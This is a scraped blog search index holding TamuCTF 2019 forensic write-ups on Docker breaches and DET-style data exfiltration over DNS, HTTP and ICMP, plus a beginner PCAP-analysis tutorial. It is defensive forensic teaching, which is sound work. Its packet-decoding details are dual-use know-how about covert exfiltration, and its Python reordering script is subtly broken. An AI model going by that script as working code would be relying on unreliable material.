hash of the docker-composer.yml: ➜ microservices md5sum aaa/home/ubuntu/docker-compose.yml a2111283f69aafcd658f558b0402fbc4 aaa/home/ubun","date":"2019-02-28","objectID":"maki.bzh/writeups/tamu2019microservices/:3:0","tags":["tamuctf","forensic","network","wireshark","pcap","cryptography","docker"],"title":"[TamuCTF 2019] - Microservices","uri":"maki.bzh/writeups/tamu2019microservices/"},{"categories":["Writeups"],"content":"3_Forensics Thanks for that information. It seems that one of our developers didn’t pay attention to what he was copying off of the internet. Can you help use figure out the extent of what the attacker was able to do? What are the last names of customers who got compromised? (alphabetical order, Capitalized first letter, comma separated ex: Asdf,Bsdf) What is the md5sum of the file that was used to exfiltrate data initially? What is the md5sum of the file that was stolen after the attacker logged in? Something to know when you’re doing forensic work with docker is: absolutely ALL about containers and other files/information related to this service is located here: /var/lib/docker. Let’s list the docker containers that have been used. We’ll go looking for the one who climbs the root in the /tmp folder of the container: ➜ microservices ls aaa/var/lib/docker/containers 90814f0051eed67a4dd291c8e3f44836c3cf3bd793818eba2e9ae7d0eedc661e 9e7b7ad707af6c0d04591d59e1b7570b784fc194c1847170d40bafc873da85d4 c7b26c91b07eef1f63c8ea3351477f2344e1873f2af8a1566954ecd0678982da c8c5438a36920a02375b7fffba9065769a3657ee48d522b5ac9a8eec18b1ad84 Each container created contains a configuration file in JSON: ➜ microservices ls aaa/var/lib/docker/containers/*/config* aaa/var/lib/docker/containers/90814f0051eed67a4dd291c8e3f44836c3cf3bd793818eba2e9ae7d0eedc661e/config.v2.json aaa/var/lib/docker/containers/9e7b7ad707af6c0d04591d59e1b7570b784fc194c1847170d40bafc873da85d4/config.v2.json aaa/var/lib/docker/containers/c7b26c91b07eef1f63c8ea3351477f2344e1873f2af8a1566954ecd0678982da/config.v2.json aaa/var/lib/docker/containers/c8c5438a36920a02375b7fffba9065769a3657ee48d522b5ac9a8eec18b1ad84/config.v2.json ➜ microservices cat aaa/var/lib/docker/containers/*/config.v2.json | jq | grep -E '\"ID\"|\"Image\"' \"ID\": \"90814f0051eed67a4dd291c8e3f44836c3cf3bd793818eba2e9ae7d0eedc661e\", \"Image\": \"tamuctf/kaliimage\", \"Image\": \"sha256:420f4338bea593a9a96151c51b3f5550fac8f7c29cb41c451b4d07c02cf9b28d\", \"ID\": \"9e7b7ad707af6c0d04591d59e1b7570b784fc194c1847170d40bafc873da85d4\", \"Image\": \"redis:4\", \"Image\": \"sha256:3ddb7885a5e075ba8ed414d0706059999aa73fceb4249bef7cb293c1ec559dfc\", \"ID\": \"c7b26c91b07eef1f63c8ea3351477f2344e1873f2af8a1566954ecd0678982da\", \"Image\": \"mariadb:10.2\", \"Image\": \"sha256:907f5f6c749d16ddd8f4a75353228a550d8eddd78693f4329c90ce51a99ec875\", \"ID\": \"c8c5438a36920a02375b7fffba9065769a3657ee48d522b5ac9a8eec18b1ad84\", \"Image\": \"tamuctf/webfront:latest\", \"Image\": \"sha256:05585189bd6cb140d5fcee52b95a05a202f3aa2ae62743a749d0d82bcacfbc5c\", A surprising image is here: kaliimage. Image Docker which has nothing to do on a web server… In the /var/lib/lib/docker/overlay2/ folder there are all the intermediate versions of the docker containers, in the form of a hash. Kind of like the commits for GitHub. ➜ microservices ls aaa/var/lib/docker/overlay2 030086336adcdf22311680627f9ec604012ecf86ed7f87b2f20c21be94a7e91f 06aa47c261686f54296a2da65bfea7ed577ff79ce2263a320c95f73e2ad51db1 0bdd99e71211b7d42c48fc86936089b1766af62159e78554434d3b7762f88bb4 0dfa81ec47cc9d78701052f24ce164b114279abb425af227eb7664624d64c848 101c6052088fb1d7b9bf6331ae2e3a052a5480b14a5e48e43eb465914880cd68 146731568c44e1ab0d9a339166cd67189b51f6e0166b301f86557aef05b0d55d [...] Each of these folders has the same architecture: ➜ microservices tree aaa/var/lib/docker/overlay2/030086336adcdf22311680627f9ec604012ecf86ed7f87b2f20c21be94a7e91f aaa/var/lib/docker/overlay2/030086336adcdf22311680627f9ec604012ecf86ed7f87b2f20c21be94a7e91f ├── diff │ └── etc │ └── apt │ └── sources.list ├── link ├── lower └── work The folder that will interest us will be the diff one, which bears its name well because it will record the differences between each container version. That’s why Docker quickly becomes greedy in terms of disk size. To find what interests me, I did something not very skilled, but which has is exhaustive: ➜ microservices ls aaa/var/lib/docker/overlay2/*/diff/ aaa/var/lib/docker/overlay2/0dfa81ec47cc9d78701052f24ce164b11","date":"2019-02-28","objectID":"maki.bzh/writeups/tamu2019microservices/:4:0","tags":["tamuctf","forensic","network","wireshark","pcap","cryptography","docker"],"title":"[TamuCTF 2019] - Microservices","uri":"maki.bzh/writeups/tamu2019microservices/"},{"categories":["Writeups"],"content":"4_Persistence Thanks for that information. We are working on how to recover from this breach. One of the things we need to do is remove any backdoors placed by the attacker. Can you identify what the attacker left behind? What is the new user that was created? What is the full name of the new docker image that was pulled down? This challenge was rather simple given the information found earlier. In step 2 (2_Analysis), I saw that the $HOME of the dev user is /root, so we suspect that it is the new user : Flag 1: dev Then, when I started investigating on docker containers (cf. 3_Forensics), I saw an image Kali named: tamuctf/kaliimage. Flag 2: tamuctf/kaliimage ","date":"2019-02-28","objectID":"maki.bzh/writeups/tamu2019microservices/:5:0","tags":["tamuctf","forensic","network","wireshark","pcap","cryptography","docker"],"title":"[TamuCTF 2019] - Microservices","uri":"maki.bzh/writeups/tamu2019microservices/"},{"categories":["Writeups"],"content":" Recently, the office put up a private webserver to store important information about the newest research project for the company. This information was to be kept confidential, as it’s release could mean a large loss for everyone in the office. Just as the research was about to be published, a competing firm published information eerily similar. Too similar… Time to take a look through the office network logs to figure out what happened. What is the IP address of the private webserver? How many hosts made contact with the private webserver that day? Filename MD5 Hash Download link capture.pcap e36ff23c6995e3595035982cced6c6a9 https://mega.nz/#!aihUgK6I!a9Lvt6R1bBKit_bE8oOSQAUCdnl9LX_5egidhK5veRM In this task, the challenge deal with a PCAP file, I let you check my article about PCAP analysis. The first flag is to find the internal IP address of a web server. Since PCAP is quite large, I just have to load it into Capanalysis and filter on the SSL and HTTP protocols, then filter on the IP that receives the most data: It was the web server we were looking for: Flag 1: 192.168.11.4 Now the second challenge is to find the number of IP addresses that have connected to this webserver. Since we know his IP address, with tshark it’s pretty easy: ▶ tshark -r capture.pcap -Y \"ip.dst == 192.168.11.4\" -Tfields -e 'ip.src' | sort | uniq 128.194.165.200 172.217.6.138 172.226.209.130 192.168.1.1 192.168.11.5 192.168.11.7 192.168.11.8 192.168.11.9 35.222.85.5 35.224.99.156 52.43.40.243 54.213.168.194 91.189.92.38 ▶ tshark -r capture.pcap -Y \"ip.dst == 192.168.11.4\" -Tfields -e 'ip.src' | sort | uniq | wc -l 13 Fortunately, all connections are done on the same day:: Flag 2: 13 ","date":"2019-02-28","objectID":"maki.bzh/writeups/tamu2019readingrainbow/:0:0","tags":["tamuctf","forensic","network","wireshark","pcap","cryptography","det"],"title":"[TamuCTF 2019] - Reading rainbow","uri":"maki.bzh/writeups/tamu2019readingrainbow/"},{"categories":["Writeups"],"content":"1_Discovery What is the IP address of the host exfiltrating data? For how long did the exfiltration happen? (Round to the nearest second. Format: MM:SS) What protocol/s was used to exfiltrate data? (Alphabetical order, all caps, comma separated, with spaces - ex: ABCD, BBCD) It’s time to open this big PCAP file in Wireshark. Thanks to the first question, we know that the attack exfiltrates some data. The best filter for that is still: data.data: We can see that our web server (192.168.11.4) is chatting with another host (192.168.11.7) via weird ICMP requests. Let’s see what these requests contain: If we get the first request with a tshark: ▶ tshark -r capture.pcap -Y \"data.data \u0026\u0026 ip.dst == 192.168.11.4\" -Tfields -e 'data.text' | head -n 1 | xxd -r -p SEx4IRV.746f74616c6c795f6e6f7468696e672e706466.REGISTER.6156eab6691f32b8350c45b3fc4aadc1 The data formatted like this looks a lot like the DET (Data Exfiltration Toolkit) framework. I had already talked about it in a writeup at the SantHackLause 2018. Flag 1: 192.168.11.7 Now we have to determine the duration of the exfiltration. With a small filter on IPs, we see some interesting things in the DNS: If we extract the last DNS request and this is indeed the last DET request, we should find a “DONE”: ▶ echo -n '534578344952562e35312e444f4e45' | xxd -r -p SEx4IRV.51.DONE Perfect, we know the first request with the “REGISTER” and the last one with the “DONE”. ▶ echo $((35.49-24.40)) 11.090000000000003 The exfiltration lasted 11 minutes and 9 seconds: Flag 2: 11.09 The last step will be the simplest, we already have all the information, to find the protocols, we will do a little tshark trick: ▶ tshark -r capture.pcap -Y \"ip.src == 192.168.11.4 \u0026\u0026 ip.dst == 192.168.11.7\" -Tfields -e '_ws.col.Protocol' | sort | uniq DNS HTTP ICMP TCP The “TCP” protocol is not counted since it is a transport protocol (see OSI Model). Flag 3: DNS, HTTP, ICMP ","date":"2019-02-28","objectID":"maki.bzh/writeups/tamu2019readingrainbow/:1:0","tags":["tamuctf","forensic","network","wireshark","pcap","cryptography","det"],"title":"[TamuCTF 2019] - Reading rainbow","uri":"maki.bzh/writeups/tamu2019readingrainbow/"},{"categories":["Writeups"],"content":"2_Exfiltration What is the name of the stolen file? What is the md5sum of the stolen file? These questions are a little bit easy since we know that the attacker used DET. First request contains both flags: SEx4IRV.746f74616c6c795f6e6f7468696e672e706466.REGISTER.6156eab6691f32b8350c45b3fc4aadc1 SEx4IRV 746f74616c6c795f6e6f7468696e672e706466 REGISTER 6156eab6691f32b8350c45b3fc4aadc1 The first hexadecimal sequence is the name of the encoded extracted file: ▶ echo -n '746f74616c6c795f6e6f7468696e672e706466' | xxd -r -p totally_nothing.pdf Flag 1: totally_nothing.pdf The second hexadecimal sequence is the MD5 hash of the encoded extracted file: Flag 2: 6156eab6691f32b8350c45b3fc4aadc1 ","date":"2019-02-28","objectID":"maki.bzh/writeups/tamu2019readingrainbow/:2:0","tags":["tamuctf","forensic","network","wireshark","pcap","cryptography","det"],"title":"[TamuCTF 2019] - Reading rainbow","uri":"maki.bzh/writeups/tamu2019readingrainbow/"},{"categories":["Writeups"],"content":"3_Data What compression encoding was used for the data? What is the name and type of the decompressed file? (Format: NAME.TYPE e.g. tamuctf.txt) Before answering the questions, it will be necessary to find a way to recover the original file. We know that the attacker used HTTP, DNS and ICMP protocols between IP 192.168.11.7 (attacker) and 192.168.11.4 (webserver) to extract his file. We will, therefore, use the following filter and save only the displayed packets to make a lightened PCAP file: ip.src == 192.168.11.4 \u0026\u0026 ip.dst == 192.168.11.7 \u0026\u0026 (http || dns || icmp We go from 15k packets to 117, it’s still more pleasant to analyze. ","date":"2019-02-28","objectID":"maki.bzh/writeups/tamu2019readingrainbow/:3:0","tags":["tamuctf","forensic","network","wireshark","pcap","cryptography","det"],"title":"[TamuCTF 2019] - Reading rainbow","uri":"maki.bzh/writeups/tamu2019readingrainbow/"},{"categories":["Writeups"],"content":"Get data from ICMP ICMP data is sent in hexadecimal when decoding on the fly with xxd piped to tshark there is no more line break and the data becomes difficult to analyze. For that, there is sed which will add more returns to the line: ▶ tshark -r exfil.pcap -Y \"icmp\" -Tfields -e \"data.text\" | xxd -r -p | sed 's/SEx4IRV/\\nSEx4IRV/g' SEx4IRV.746f74616c6c795f6e6f7468696e672e706466.REGISTER.6156eab6691f32b8350c45b3fc4aadc1 SEx4IRV.2.85a846255178c4cbbd77ee999d7b7736892afaa392cf6ae7ccf9ee39f79efb9c3367325a767c1c7db414c0d4dadc4c78b0b5 SEx4IRV.12.2bb53aaf40c5354868c984db4df8b209379f172b26dcbc5f6e99f04a130ef3e234f944e875a64f746d26fc920977987079ee [...] ▶ tshark -r exfil.pcap -Y \"icmp\" -Tfields -e \"data.text\" | xxd -r -p | sed 's/SEx4IRV/\\nSEx4IRV/g' \u003e clear_icmp These are the ICMP data extracted from a file. ","date":"2019-02-28","objectID":"maki.bzh/writeups/tamu2019readingrainbow/:3:1","tags":["tamuctf","forensic","network","wireshark","pcap","cryptography","det"],"title":"[TamuCTF 2019] - Reading rainbow","uri":"maki.bzh/writeups/tamu2019readingrainbow/"},{"categories":["Writeups"],"content":"Get data from HTTP HTTP data are sent as POST data: Same process as for ICMP: ▶ tshark -r exfil.pcap -Y \"http\" -Tfields -e urlencoded-form.value | xxd -r -p | sed 's/SEx4IRV/\\nSEx4IRV/g' SEx4IRV.0.1f8b080094e16c5c0003ed596b6c1c5715beb30f7b9dd8eb4dea249b07cdb64d8493ca9b5d3b7ea4698877fd1a83ed98d40e SEx4IRV.1.01ea4cd7deb1bdb00f6b77b6d8018125a755b7a94390a0ca1f50a5a20a103f5ca844040236b82a25bf1250451005b9555339 SEx4IRV.3.3960e6981a034d81000a36ed6f6a0ab6049a5b5a5120d818686c41bec047ec17a56c468ba47d3ea44512d931adfc50dcadfc ▶ tshark -r exfil.pcap -Y \"http\" -Tfields -e urlencoded-form.value | xxd -r -p | sed 's/SEx4IRV/\\nSEx4IRV/g' \u003e clear_http ","date":"2019-02-28","objectID":"maki.bzh/writeups/tamu2019readingrainbow/:3:2","tags":["tamuctf","forensic","network","wireshark","pcap","cryptography","det"],"title":"[TamuCTF 2019] - Reading rainbow","uri":"maki.bzh/writeups/tamu2019readingrainbow/"},{"categories":["Writeups"],"content":"Get data from DNS The functioning of the DNS is a bit more different, because each request will be encoded in another. ▶ tshark -r exfil.pcap -Y \"dns\" -Tfields -e dns.qry.name | cut -d'.' -f2 | xxd -r -p | sed 's/SEx4IRV/\\nSEx4IRV/g' SEx4IRV.5.a6cb22df81782e99b8f30efd5976f11c219f61477c5da8d1d1851a1fc79f60ed4ed9783b1bb3cb33bb3cd307bec21c5b11fa SEx4IRV.7.d868cbfe7df168433c96cc4e374cb7b534b4ecf76752fe46ea9387e9f60c0c537d32df30b4a4bc8e61a4fcedfa9fff74f35f SEx4IRV.8.af6baf4c5fb9f1cbf7479e0bfce2f22b44d7858af346e66396d9137c6238025db0a4cf2098419e36e0ff460bbca10cee2d83 ▶ tshark -r exfil.pcap -Y \"dns\" -Tfields -e dns.qry.name | cut -d'.' -f2 | xxd -r -p | sed 's/SEx4IRV/\\nSEx4IRV/g' \u003e clear_dns ","date":"2019-02-28","objectID":"maki.bzh/writeups/tamu2019readingrainbow/:3:3","tags":["tamuctf","forensic","network","wireshark","pcap","cryptography","det"],"title":"[TamuCTF 2019] - Reading rainbow","uri":"maki.bzh/writeups/tamu2019readingrainbow/"},{"categories":["Writeups"],"content":"Ordering each request All requests must be put back in the right order. This is how DET works: File ID Packet number Data This query construction is not valid for the first (REGISTER) and last (DONE) requests. To put all this in order, python will do it for us. I will put all the lines in a dictionary with the packet number as the key: f = open('clear_data') a = f.read() f.close() final = \"\" tmp = {} for i in range(0,len(a)): tmp[int(a[i].split('.')[1])] = a[i].split('.')[2] for j in range(0,len(tmp)): final = tmp[j] g = open('result','wb') g.write(final) g.close() Here is what we obtain: ▶ file result result: ASCII text, with very long lines, with no line terminators ▶ cat result 1f8b080094e16c5c0003ed596b6c1c5715beb30f7b9dd8eb4dea249b07cdb64d8493ca9b5d3b7ea4698877fd1a83ed98d40e01ea4cd7deb1bdb00f6b7 [...] ▶ cat result | xxd -r -p \u003e test ▶ file test test: gzip compressed data, last modified: Wed Feb 20 05:11:48 2019, from Unix, original size 10240 Remember the first question of the challenge is the type of compression used: Flag 1: gzip Now, let’s uncompress the archive and got the original file: ▶ mv test test.gz ▶ gzip -d test.gz ▶ file test test: POSIX tar archive (GNU) ▶ tar xvf test stuff ▶ file stuff stuff: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e228bab316deed74b478d8f5bdef5d8c30bbd1b4, not stripped And now, let’s validate the last flag: Flag 2: stuff.elf ","date":"2019-02-28","objectID":"maki.bzh/writeups/tamu2019readingrainbow/:3:4","tags":["tamuctf","forensic","network","wireshark","pcap","cryptography","det"],"title":"[TamuCTF 2019] - Reading rainbow","uri":"maki.bzh/writeups/tamu2019readingrainbow/"},{"categories":["Shorts"],"content":"How to basic on Wireshark usage.","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"Introduction Whether in “Capture The Flag” (CTF) events or even in professional life, we work with network captures. PCAP (Packet capture), is rich in information. It’s easy to get lost in the amount of information and start on wrong tracks. Throughout this MOOC, I will introduce you the methodology to be adopted to deal with this type of situation. Firstly, I will try to describe the PCAP content, list some tools and finally practical exercises resulting from CTF tests or malicious traffic. What is a PCAP file? PCAP means “Packet Capture”, as its name says, this kind of file contains complete packet going through a network interface. Complete packet means that PCAP files will contain data from second to the seventh layer of the OSI model. ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:0:0","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"What are they used for? As we have just seen in Figure 1, a PCAP contains all information in a packet. It can, therefore, be used to identify malicious traffic (attacker, malware…), track a threat, identifies rogue DHCP servers, monitors intrusions, or simply for research purposes… ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:1:0","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"Who is using PCAP? A whole bunch of people: researchers, system administrators, malware hunters or analysts during for incident response. Tools Every analyst needs a well-stocked toolbox and he needs to know well its tools. Here are the main tools I use when I have to analyze PCAP file: Wireshark-qt / tshark CapAnalysis Binwalk / Foremost Scripting languages (ex: Python / Bash) Patience and coffee ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:2:0","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"Wireshark / tshark Wireshark is a tshark-based analysis and capture tool, so I’m talking about both in the same category. Wireshark provides a fairly graphical overview with intuitive filters. Here is an image of Wireshark in use: tshark is a tool used to dump and analyze network information. It is possible to select a particular protocol, IP address or other useful information like Wireshark. The main advantage of tshark on Wireshark, is data extraction. The use of this tool may seem obscure, but here is its syntax: tshark -r filename.pcap -Y display_filter -Tfields -e some_specific_filter filename.pcap: PCAP file to analyze ; display_filter: This parameter will take the wireshark display filter as an argument ; some_specific_filter: This will be used to extract a specific data. This PCAP comes from a CTF challenge. Complete writeup can be found on Ressource 3. ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:3:0","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"CapAnalysis CapAnalysis will be used to perform a statistical analysis of PCAP file, such as counting the number of requests per IP, the list of protocols used over time and many others. It provides a good overview of PCAP file before starting the analysis. A docker is available on Docker Hub (see Resources 4). ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:4:0","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"Binwalk / Foremost Binwalk is a fast, easy to use tool for analyzing, reverse engineering, and extracting firmware images. It will detect some file pattern inside another. For example, a packet capture during PNG file transfer: Foremost is similar to Binwalk. ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:5:0","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"Scripting languages Python and bash are often used because they are really user friendly and there are lot of libraries. For Python: PyShark Scapy For Bash: grep strings tr xxd ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:6:0","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"TSURUGI Linux The Linux distribution TSURUGI has been developed for forensic analysts in order to make a turnkey OS with all the essential pre-configured tools. The tools mentioned above are all installed in this distribution, even more. Filename SHA1 Download link tsurugi_lab_2018.1.iso b54895db6fba93239b668edb9f5ef02bef975b40 https://tsurugi-linux.org/downloads.php Pimp my Wireshark Before starting the analysis, it is important to correctly configure your tools. Wireshark will probably be the most frequently used tool in analysis. An important point to add is that the configuration I will present is my own, it is up to you to make your own. I am open to your changes and would be happy to discuss about them. ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:7:0","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"Column changes By default, the configuration of this tool is acceptable. We will add the following columns to make our Wireshark displaying more relevant results: Packet source port Packet destination port Hostname Change date format Display transferred data in hex The first column, containing the packet numbers, will be deleted. Indeed, it is possible to order the packages over time, which is more relevant, in my opinion. To modify a column in Wireshark, simply go to the Columns menu at the path: Edit -\u003e Preferences -\u003e Columns In a first time, we have to delete the number column: Add a column Select the filter Src port (unresolved) and Dst port (unresolved) You can move the column where you want. Don’t let a column behind the ‘Info’ one, otherwise the column won’t be displayed. Another important point to notice, the packet timestamp. Originally, Wireshark does not display it following ISO 8601 standard. You can change it: One of the protocols that are recurrent in a PCAP is the HTTP protocol. This protocol appears frequently because any user will generate this kind of traffic while browsing the Internet, applications, and software also use it for multiple reasons, etc…. In a CTF, challenges contain unnecessary requests, in order to parasitize the PCAP traffic and try to drown the challenger under the amount of information. For malware, it may be interesting to retrieve communications with its command and control server, because it can receive orders, download other malware… To have a PCAP file containing HTTP traffic, just open Wireshark and start capturing on a network interface with an Internet access. With the following request in a terminal, it’s enough to generate HTTP traffic: $ curl https://www.google.com/ Now, it could be really nice to get hostname corresponding to IP address: Just right clicking on the desired data and apply it as a column. This method can be applied to anything you want, knowing that adding and deleting a column is very easy, so don’t hesitate to modify Wireshark according to your investigation. Another column to be added, which may be interesting in some cases, will be the data that are passing through the network. It is possible to add a new column with the filter data.data, via the custom menu. To generate some traffic, you can use netcat: ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:8:0","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"Plugins It is possible to develop and create Lua plugins for Wireshark. The Pentest Academy team has developed some interesting plugins (see Resource 5) to see domain names, DHCP connections or GET and POST request information. The installation is quite simple, just clone the repository and place the plugins in the right folder: $ git clone https://github.com/pentesteracademy/patoolkit.git $ cp -r patoolkit/plugins/* /home/maki/.local/lib/wireshark/plugins/ So we have access to the Pentester Academy plugins. If either of you do, I’ll be curious to know! :) Methodology ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:9:0","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"Introduction A full packet network capture is a slow and heavy process, which is why it is rarely seen in an enterprise information system. To be aware of the noise generated by a networked device, try putting Wireshark in capture mode on your ethernet or wifi interface. All operating systems are sending ICMP or ARP requests to ensure that the equipment is properly connected. There are more specific things like the broadcast of a Windows system on the network. That’s why we spent a little time earlier to configure our tools correctly. It is extremely easy to get lost among all these logs and forget what you were looking for at the beginning. In this part of the course, I will share my methodology when analyzing a PCAP file. This methodology is divided into four main areas: Overview\u0026static analysis Hypothesis Checking Find the treasure The aim is starting from a “high level” analysis, to establish hypotheses, verify them and establish others from the results obtained. And do not forget what we are looking for at the beginning: the treasure! ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:10:0","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"Overview \u0026 static analysis Throughout this course, I will analyze the same PCAP file as the one used in the prerequisites: Filename MD5 Download link OtterLeak.pcap d0ab559c54fffe713fd13e9b0f7174df https://mega.nz/#!2DwzBaaR!VcTfsZadubKUTNn2LwPXQXoZ2sxpbxHt65B-Wj1N-so First of all, it is advisable to do a static analysis of the PCAP file. As presented in the previous parts, I use the CapAnalysis tool. The goal here will be to determine the interesting artifacts and build our hypotheses. It may be interesting to start with the following points: Protocol used Amount of data sent Source and destination IP Geolocation Filtering on time ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:11:0","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"State of the art In the Figure above, we can see the SMB and HTTP protocols are much more used than the others. We can try to filter through these protocols to see what comes out of them: By filtering on the protocols, we can see that the two most talkative IPs are these two internal IPs: Source IP: 10.0.0.6 Destination IP: 10.0.0.33 Let’s try to find something else on these IPs. By searching a little bit in the CapAnalysis menus, we can notice some interesting data: Thanks to Figure 3, we can see that IPs 10.0.0.6 and 10.0.0.33 are the ones that communicate most with each other. In addition, we were able to learn that IP 10.0.0.33 has a domain name: Pika.local. We are reaching a point where we will have to start writing hypotheses and test them for the future. ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:11:1","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"Hypothesis With the information retrieved from the static analysis, we are able to identify the first hypotheses. Personally, I prefer to write them on a board or use paper and pencil to keep them in front of me. There is nothing worse in forensic than losing sight of what you are looking for. In my opinion, at this stage, it’s better to be fairly generalist at first and then to refine more and more. There will be what can be called “feedback loops”. It just means knowing when to step back from the situation when you fall into a deadlock. The methodology can be summarized in the following diagram: By listing the information in our possession: IPs 10.0.0.33 -\u003e Pika.local 10.0.0.6 Protocols SMB HTTP By limiting to this information, we are already making a huge filter on the entire PCAP file. It is important to keep in mind that the treasure we are looking for, may not be in there. But knowing that, you can imagine some things: Data extraction via HTTP? SMB? Communications to a command and control server? Open SMB shares with open access data (anonymous user)? An attack on the SMB, such as EternalBlue? A vulnerable web application? These are examples, the aim is to identify as many hypotheses as possible in order to try to be as exhaustive as possible and then not miss something. Once the static analysis and the first hypotheses are completed, it is time to open Wireshark for a more in-depth analysis. ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:12:0","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"Checking What I called “Checking part” is the validation or not of the previous hypotheses. This verification will mostly be done via Wireshark and tshark. What you have to force yourself to do throughout the analysis is to continue to identify hypotheses and record them. The hypotheses generated during the static analysis of the PCAP file only give a global idea, an axis of exploration to avoid getting lost in this sea of data. Network information is important, it will serve as an indicator of compromise (IOC). These indicators allow CERTs and other analysts to determine malicious behavior. Malware often uses particular patterns: an exotic user-agent, a C\u0026C IP… With this information, analysts can create rules for SIEM / IDS / IPS and other network analysis equipment. These rules will be used to identify malicious behavior quickly. An IOC can be: IP User-Agent Host Specific pattern ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:13:0","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"Round 1 With the information retrieved during the static analysis, let’s try to build a filter: IPs filtering Protocol filtering It gives us: ((smb2 || http) || (ip.addr == 10.0.0.33)) \u0026\u0026 (ip.addr == 10.0.0.6) Once this filter is applied, something comes up: Now we strongly assume that there is data exfiltration via SMB2. It is important to step back from the analysis, so there are other questions to ask: Who or what is responsible for this behavior? Is the exfiltered data encrypted? Encoded? At this point, it comes back to what I said at the beginning of this MOOC: make other hypotheses and verify them, repeat the operation as long as necessary in order to find something interesting. ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:13:1","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"Round 2 If we look closely, the exfiltered bytes are sent only from IP 10.0.0.33 on port 445 to 10.0.0.6 on port 139. It is possible to refine our Wireshark filter a little: (ip.src == 10.0.0.33) \u0026\u0026 (ip.dst == 10.0.0.6) \u0026\u0026 smb2 \u0026\u0026 data.data The data looks to a very particular encoding system, base64: Alpha chars, upper and lowercase Digital chars Terminated by an equal To be sure of that, tshark will be more useful than Wireshark: The final command at the end of the GIF above is: $ tshark -r OtterLeak.pcap -Y '(ip.src == 10.0.0.33) \u0026\u0026 (ip.dst == 10.0.0.6) \u0026\u0026 smb2 \u0026\u0026 data.data' -Tfields -e data.data | tr -d '\\n' | xxd -r -p | rev | base64 -d tshark: This command will extract all data transferred from 10.0.0.33 to 10.0.0.6 through SMB2 in the PCAP ; tr: This command will remove all line return in the bash output ; xxd: This command will convert hex digit into ascii chars ; rev: This command will reverse the string base64: This command will decode the base64 data ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:13:2","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"Find the treasure After a while, we will find interesting things about the malicious actions carried out. However, analysts are fighting another scourge: time. The feeling of missing something can be really 